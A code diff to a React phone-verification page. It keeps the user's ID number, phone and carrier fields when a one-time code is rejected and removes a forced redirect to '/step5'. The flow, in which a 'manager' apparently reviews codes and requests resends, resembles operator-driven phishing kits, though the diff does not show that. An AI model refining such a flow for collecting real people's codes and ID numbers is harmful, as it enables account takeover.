@@ -45,6 +45,7 @@ export default function VerifyPhonePage() {
 
   const visitorId = typeof window !== 'undefined' ? localStorage.getItem("visitor") || "" : ""
 
+  // Reset UI only (keep user data) - don't clear form fields on rejection
   const resetPhoneVerificationUi = () => {
     setShowPhoneOtpDialog(false)
     setShowStcModal(false)
@@ -53,9 +54,7 @@ export default function VerifyPhonePage() {
     setOtpRejectionError("")
     setPhoneError("")
     setIdError("")
-    setIdNumber("")
-    setPhoneNumber("")
-    setSelectedCarrier("")
+    // DON'T clear idNumber, phoneNumber, selectedCarrier - keep user data
     setPhoneRejectionMessage("")
     if (typeof window !== 'undefined') {
       localStorage.removeItem('phoneOtpRejectionError')
@@ -92,8 +91,8 @@ export default function VerifyPhonePage() {
         const nextPhoneStatus = data.phoneOtpStatus || null;
         const nextRejectionMessage = data.phoneRejectionMessage || null;
 
-        // Rejection: always update rejection message and reset form when phone is rejected
-        // Check if rejection message changed or if it's a new rejection
+        // Rejection: update rejection message and show error
+        // DON'T force user to this page - let them navigate freely
         const lastRejectionMsg = (window as any).__lastRejectionMsg__;
         if (nextPhoneStatus === 'rejected' && nextRejectionMessage && 
             (lastPhoneStatus !== nextPhoneStatus || lastRejectionMsg !== nextRejectionMessage)) {
@@ -101,13 +100,7 @@ export default function VerifyPhonePage() {
           resetPhoneVerificationUi()
           setPhoneRejectionMessage(nextRejectionMessage)
           (window as any).__lastRejectionMsg__ = nextRejectionMessage;
-          if (typeof window !== 'undefined') {
-            const currentPath = window.location.pathname;
-            if (currentPath !== '/step5' && currentPath !== '/phone') {
-              window.location.href = '/step5';
-              return;
-            }
-          }
+          // REMOVED: Don't force redirect to step5 - user can navigate freely
         }
 
         // Show resend request if manager requested it.
